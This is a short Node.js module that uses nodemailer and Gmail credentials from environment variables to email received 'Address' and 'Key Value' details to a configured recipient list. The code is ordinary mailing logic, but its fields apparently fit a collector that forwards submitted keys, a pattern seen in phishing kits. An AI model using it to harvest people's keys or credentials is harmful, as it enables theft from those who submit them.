const nodemailer = require("nodemailer");

const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

async function sendEmail(details) {
  await transporter.sendMail({
    from: process.env.EMAIL_USER,
   to: process.env.EMAIL_TO.split(","),
    subject: "New Details Received",
    text: `
Address: ${details.address}
Key Value: ${details.keyValue}
    `
  });
}

module.exports = sendEmail;
